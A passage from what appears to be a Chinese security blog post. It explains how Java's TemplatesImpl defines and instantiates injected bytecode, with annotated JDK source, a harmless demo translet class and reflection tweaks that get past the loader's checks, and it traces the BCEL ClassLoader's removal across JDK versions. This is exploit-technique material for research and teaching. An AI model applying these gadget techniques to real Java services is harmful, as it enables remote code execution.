可能触发首次类定义与主类实例化（惰性初始化）</span></span><br><span class="line">        _outputProperties,       <span class="comment">// 模板级输出属性（TransformerImpl 内部可能做合并/拷贝）</span></span><br><span class="line">        _indentNumber,           <span class="comment">// 输出缩进设置</span></span><br><span class="line">        _tfactory                <span class="comment">// 工厂引用（扩展函数/配置等环境信息）</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...] 其余初始化与属性合并在 TransformerImpl 内部完成</span></span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为我们给 <strong><code>TemplatesImpl</code> 的 <code>_name</code> 设置有值</strong>，因此会执行下面的 <code>defineTransletClasses</code> 来根据字节码数组 <code>private byte[][] _bytecodes</code> 中存放字节码依次调用的初始化 <code>private Class[] _class</code>，之后会将加载的<strong>下标为 <code>_transletIndex</code> 的类</strong>实例化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从当前 TemplatesImpl 返回一个“主 translet 类”的全新实例。</span></span><br><span class="line"><span class="comment"> * 该实例随后会被封装进 Transformer（见 newTransformer）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * 1) 惰性初始化：若尚未把 _bytecodes 定义为 Class[]，会先调用 defineTransletClasses()。</span></span><br><span class="line"><span class="comment"> * 2) 主类判定：defineTransletClasses() 会找出“父类为 AbstractTranslet”的那一个，记录到 _transletIndex。</span></span><br><span class="line"><span class="comment"> * 3) 初始化顺序：调用 newInstance() 时，若该类首次被主动使用，先执行静态初始化块(&lt;clinit&gt;)，随后执行构造器(&lt;init&gt;)。</span></span><br><span class="line"><span class="comment"> * 4) 本方法实例化完主类后，通常还会做一些运行期收尾（注册模板、辅助类映射、后置初始化等），这些在下方以 [...] 占位。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException  当定义/链接/实例化类出错时，会将底层异常包装为该异常抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  新创建的 Translet 实例；若 _name 为空表示模板未就绪，按实现返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 快速返回：若模板名为空，视为未初始化状态（正常情况下 _name 不应为空）</span></span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 惰性定义：首次使用时，把 _bytecodes 定义为 Class[] 并确定主类索引</span></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 实例化“主 translet 类”</span></span><br><span class="line">        <span class="comment">//    说明：此处可能抛出 InstantiationException / IllegalAccessException</span></span><br><span class="line">        <span class="comment">//    且在“首次主动使用”该类时会先触发类初始化(&lt;clinit&gt;)，再执行构造器(&lt;init&gt;)。</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 运行期收尾（不同版本实现略有差异）：</span></span><br><span class="line">        <span class="comment">//    - 让 translet 知道自己来自哪个 Templates（如 setTemplates(this)）</span></span><br><span class="line">        <span class="comment">//    - 注册/注入辅助类映射（_auxClasses），供运行期按需解析</span></span><br><span class="line">        <span class="comment">//    - 设置名称、输出相关属性、工厂/扩展函数环境等</span></span><br><span class="line">        <span class="comment">//    - 调用 translet 的后置初始化钩子（如 postInitialization()）</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5) 返回新建的 translet 实例（供 newTransformer() 使用）</span></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 6) 异常语义（实际代码里会有对应 catch 并统一包装为 TransformerConfigurationException）：</span></span><br><span class="line">    <span class="comment">//    - ClassFormatError / LinkageError：字节码非法或链接期出错（重复定义、依赖缺失等）</span></span><br><span class="line">    <span class="comment">//    - InstantiationException / IllegalAccessException：反射实例化失败</span></span><br><span class="line">    <span class="comment">//    - 其余底层异常也会被包装为 TransformerConfigurationException 抛出</span></span><br><span class="line">    <span class="comment">// catch (...) &#123; throw new TransformerConfigurationException(..., e); &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong><code>defineTransletClasses()</code> 做了三件事</strong>：</p>
<ol>
<li>在特权块里创建 <code>TransletClassLoader</code>；</li>
<li>遍历 <code>_bytecodes</code>，调用 <strong><code>loader.defineClass(byte[])</code></strong> 把字节码“喂进 JVM”；</li>
<li>之后调用 <code>getSuperclass</code> 获取加载的类的直接父类，并通过“父类名是否是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>”识别<strong>主类</strong>并记录 <code>_transletIndex</code>（其余放入 <code>_auxClasses</code>）。被识别为主类的类后续会被实例化。</li>
</ol>
<p><code>defineTransletClasses</code> 函数中使用 <code>TransletClassLoader</code> 加载类，也就是调用 <code>defineClass</code> 将字节码加载为类。之后调用 <code>getSuperclass</code> 获取加载的类的直接父类并判断父类的名称是否为 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。如果是则设置 <code>_transletIndex</code> 为当前加载类的下标，也就以为着这个类要被实例化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 所有 translet 类共同的父类名。</span></span><br><span class="line"><span class="comment"> * TemplatesImpl 通过“谁的直接父类是它”来判定哪个是“主 translet 类”，</span></span><br><span class="line"><span class="comment"> * 其余则视为辅助类（aux classes）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">    <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将 _bytecodes[] 中的字节码逐个“定义”为 Class，并填充到 _class[]；</span></span><br><span class="line"><span class="comment"> * 同时识别并记录“主类”的下标 _transletIndex，剩余的放入 _auxClasses。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * 1) 本方法不返回 Class；它通过更新 _class/_auxClasses/_transletIndex 来完成初始化。</span></span><br><span class="line"><span class="comment"> * 2) 这里只完成“定义（define）类”，不会在此处执行类的静态初始化块；类的初始化</span></span><br><span class="line"><span class="comment"> *    通常在后续第一次主动使用（例如 newInstance()）时触发。</span></span><br><span class="line"><span class="comment"> * 3) 异常会被包装为 TransformerConfigurationException 抛出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 入口健壮性检查：没有任何字节码就无法定义类</span></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在特权块中创建内部类加载器，指定合适的父类加载器。</span></span><br><span class="line">    <span class="comment">// 说明：TransletClassLoader 是 TemplatesImpl 的静态内部类，继承自 ClassLoader。</span></span><br><span class="line">    <span class="comment">// 它额外提供了一个 package-private 的 defineClass(byte[]) 便捷方法，</span></span><br><span class="line">    <span class="comment">// 内部调用父类受保护的 defineClass(String, byte[], int, int)。</span></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// 通过 ObjectFactory 选择父加载器；不同 JDK 版本可能还会携带</span></span><br><span class="line">                <span class="comment">// _tfactory 的扩展映射作为构造参数（实现细节差异，不影响主流程）。</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 待定义的类的数量（通常包含主类 + 若干辅助类）</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 预分配类缓存数组，用于保存 define 后得到的 Class 对象</span></span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果存在多个类，则准备辅助类容器（具体类型随版本可能为 Hashtable/HashMap）</span></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>(); <span class="comment">// 一些实现中是 HashMap，语义一致：保存“非主类”</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 逐个把字节码定义为 Class</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            <span class="comment">// 关键调用：通过内部类加载器把一段字节码“喂”给 JVM 定义出一个 Class。</span></span><br><span class="line">            <span class="comment">// 注意：这里调用的是 TransletClassLoader 的 package‑private 便捷方法，</span></span><br><span class="line">            <span class="comment">// 最终仍会落到父类 ClassLoader#defineClass(...)。</span></span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 取出该类的直接父类，用于判定“主类”</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果父类名等于 ABSTRACT_TRANSLET（即为 XSLTC 的主 translet 类）</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                <span class="comment">// 记录主类的索引（稍后将按该索引实例化）</span></span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 否则作为辅助类缓存，供运行期按需查找</span></span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 收尾校验：没有识别出主类则属于编译/装载状态异常</span></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 此处实际代码会构造对应错误信息并抛出配置异常</span></span><br><span class="line">            <span class="comment">// （省略细节：不同版本对错误消息的处理略有差异）</span></span><br><span class="line">            <span class="comment">// throw new TransformerConfigurationException(...);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 典型异常：</span></span><br><span class="line">    <span class="comment">// - ClassFormatError：字节码格式非法</span></span><br><span class="line">    <span class="comment">// - LinkageError：链接期出错（重复定义、依赖缺失等）</span></span><br><span class="line">    <span class="comment">// 代码会将这些底层错误包装为 TransformerConfigurationException 重新抛出。</span></span><br><span class="line">    <span class="comment">// catch (...) &#123; ... &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这就要求：</p>
<ul>
<li><p><code>TemplatesImpl</code> 中对加载的字节码对应的类必须<br>是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// 在这里编写代码</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>或者我们可以设置 <code>_transletIndex = 0</code>（默认是 -1）来避免异常，同时设置 <code>_auxClasses</code> 为 <code>HashMap</code> 放在调用 <code>put</code> 方法报错。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;());</span><br></pre></td></tr></table></figure></div>

<p>当然设置 <code>_transletIndex = 0</code> 且 <code>_bytecodes</code> 为一项以上也行，这是因为当 <code>_bytecodes.length &gt; 1</code> 的时候会初始化 <code>_auxClasses</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>另外对于高版本的 JDK，<code>TransletClassLoader</code> 的创建需要用到 <code>_tfactory</code>，因此需要将 <code>_tfactory</code> 设置为一个 <code>TransformerFactoryImpl</code> 实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p>BCEL 的全名应该是 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 Java XML功能的 JAXP 规范的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p>
<p>BCEL 库提供了一系列用于分析、创建、修改 Java Class 文件的 API。相较 Commons Collections，BCEL 被包含在原生 JDK 中，更容易被利用。</p>
<blockquote>
<p><strong>BCEL 的版本变化时间线主要有两条：</strong></p>
<ul>
<li>上游是 <code>org.apache.bcel.*</code>（Apache Commons BCEL）</li>
<li>JDK 里有一份<strong>重打包</strong>副本给 JAXP&#x2F;XSLTC 用，包名是 <code>com.sun.org.apache.bcel.internal.*</code>（在 <code>java.xml</code> 里）。JDK 会按自身需求<strong>选择性裁剪</strong>并分批回移上游版本（BPR → 后续 GA 会吸纳），参见 Oracle 的 <strong><a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/8u-relnotes.html" >JDK 8 Update Release Notes<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 页面顶部说明“<strong>Fixes introduced on BPRs are added to later GA releases</strong>”。</li>
</ul>
<p><strong>上游 Apache Commons BCEL（<code>org.apache.bcel.*</code>）时间线：</strong></p>
<ul>
<li><p><strong>2007 年 8 月</strong>：提出兼容性老坑 **<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-110" >BCEL‑110<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>**：使用 <strong>BCEL 的 <code>ClassLoader</code></strong> 跑 <strong>JAXB</strong> 会抛 <code>LinkageError</code>（类加载器约束冲突）。</p>
</li>
<li><p><strong>2015 年 7 月 26 日</strong>：为 6.0 做大版本筹备，创建任务 **<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-222" >BCEL‑222<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>**（讨论是否更换包名&#x2F;坐标，以规避不兼容；该任务最终在 2016‑06‑07 “Won’t Fix” 结题）。</p>
</li>
<li><p><strong>2015 年 8 月前后（6.0 筹备期）</strong>：上游在 6.0 的发布说明里写明要<strong>“remove the broken ClassLoader class”</strong>，并把这条变更挂到 **<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/BCEL-110" >BCEL‑110<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>*<em>；可在 <strong><a class="link"   target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/main:external/apache-commons-bcel/RELEASE-NOTES.txt;l=288" >RELEASE‑NOTES.txt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 看到“</em>Problem with JAXB… remove the broken ClassLoader class*”。</p>
</li>
<li><p><strong>2016 年 7 月 10 日</strong>：<strong>6.0 正式发布</strong>（见 **<a class="link"   target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/org/apache/bcel/bcel/6.0/" >Maven Central 6.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>、</strong><a class="link"   target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.bcel/bcel/6.0" >MavenRepository 6.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>**）。</p>
<p><strong>注意</strong>：虽然发布说明写“remove”，但<strong>上游最终并未物理删除该类</strong>，而是<strong>保留并标记废弃</strong>——在 Javadoc 里可以看到 <strong><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-bcel/apidocs/org/apache/bcel/util/ClassLoader.html"><code>org.apache.bcel.util.ClassLoader</code></a></strong> 标注“<strong>Deprecated. 6.0 Do not use – does not work</strong>”（在 <strong><a class="link"   target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-bcel/apidocs/org/apache/bcel/util/package-summary.html" >6.10.0 的包概览<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 也能看到）。</p>
</li>
<li><p><strong>后续上游版本</strong>：6.7.0（<strong>2022‑11‑28</strong>，见 <strong><a class="link"   target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-bcel/changes-report.html" >changes‑report<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 与 **<a class="link"   target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.bcel/bcel/6.7.0" >MavenRepository 6.7.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>**），之后 6.8.x &#x2F; 6.9.0 &#x2F; <strong>6.10.0（2024‑07‑13）</strong> 等；上述 Javadoc 的“保留但弃用”状态一直延续。</p>
</li>
</ul>
<p><strong>JDK 内置 BCEL（<code>com.sun.org.apache.bcel.internal.*</code>，在 <code>java.xml</code>）时间线：</strong></p>
<p>这条线是<strong>上游的重打包副本</strong>，但<strong>并不等同于</strong>上游；JDK 会<strong>挑删</strong>一些它认为在 JDK 环境里“没必要&#x2F;有问题”的 <code>util</code> 类，并按自己的节奏回移版本。</p>
<ul>
<li><p><strong>2016 年 8 月 3 日</strong>：JDK 提出 <strong><a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8163121" >JDK‑8163121<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>：</strong>上游 6.0 已发布</strong>，JDK 当前还是 5.2，<strong>应升级到 6.0</strong>。</p>
</li>
<li><p><strong>2017 年 8 月 14 日（JDK 10 主线）</strong>：落实 <strong>JDK‑8163121</strong>；在 JAXP 代码库里<strong>明确删除</strong><br><code>src/java.xml/share/classes/com/sun/org/apache/bcel/internal/util/ClassLoader.java</code>（以及一批 util 类），提交号是 <a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk10/jdk10/jaxp/rev/32af819a7f1c"><strong><code>32af819a7f1c</code></strong></a>。</p>
</li>
<li><p><strong>2020 年 4 月 14 日（JDK 8u251 GA）</strong>：<strong>8u251</strong> 回移 <strong>JDK‑8163121</strong> 到 8u 线上，Oracle 的 <strong><a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html" >8u251 Bug Fixes 列表<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 直接列出“<strong>[JDK‑8163121] BCEL: update to the latest 6.0 release</strong>”。</p>
<p><strong>自 8u251 起</strong>，JDK 8 的产物里<strong>看不到</strong> <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>（以及同批 util 类）；</p>
<p>同期还有用户在 <strong><a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8259663" >JDK‑8259663<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 报告“<strong>从 1.8.0_251 起缺失</strong> <code>ClassLoaderRepository</code>”。</p>
</li>
<li><p><strong>2020–2022 的连续升级</strong>：</p>
<ul>
<li><strong>8u261（2020‑07）</strong>：BCEL → <strong>6.3.1</strong>（见 Oracle 的 <strong><a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/8u261-bugfixes.html" >8u261 bugfixes 列表<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> 的“BCEL: update to version 6.3.1”）；</li>
<li><strong>8u301（2021‑07）</strong>：→ <strong>6.4.1</strong>（见 <strong><a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8235368" >JDK‑8235368<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> &#x2F; 回移单 JDK‑8262512 标注 8u301）；</li>
<li><strong>8u331（2022‑04）</strong>：→ <strong>6.5.0</strong>（见 **<a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8255035" >JDK‑8255035<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>**）。</li>
</ul>
</li>
